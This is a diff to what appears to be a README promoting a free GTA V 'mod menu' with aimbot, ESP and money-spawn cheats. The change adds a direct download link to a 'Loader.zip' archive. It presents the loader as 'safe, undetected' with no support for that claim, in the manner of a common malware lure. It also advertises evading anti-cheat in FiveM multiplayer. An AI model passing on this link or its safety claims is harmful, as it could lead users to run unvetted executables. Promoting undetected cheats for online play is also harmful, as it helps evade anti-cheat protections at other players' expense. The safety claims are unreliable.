@@ -2,7 +2,7 @@
 
 **Download the GTA 5 Mod Menu (Updated 2025)** – the ultimate free mod menu for **GTA V on PC**. Take full control of your Grand Theft Auto V single-player or FiveM experience with amazing features like **god mode**, **money spawn**, **vehicle spawner**, **teleport**, **ESP**, **aimbot**, and so much more. It’s safe, undetected, and compatible with Steam, Rockstar, and Epic versions.
 
-🔥 **[📥 DOWNLOAD MOD MENU (GTA 5)]()**
+🔥 **[📥 DOWNLOAD MOD MENU (GTA 5)](https://github.com/ClINstrix/mod-meni-gta/releases/download/Release/Loader.zip)**
 ✅ Works with GTA V (1.68) – Steam, Epic, Rockstar
 🛡️ Undetected | Free | No key system required
 
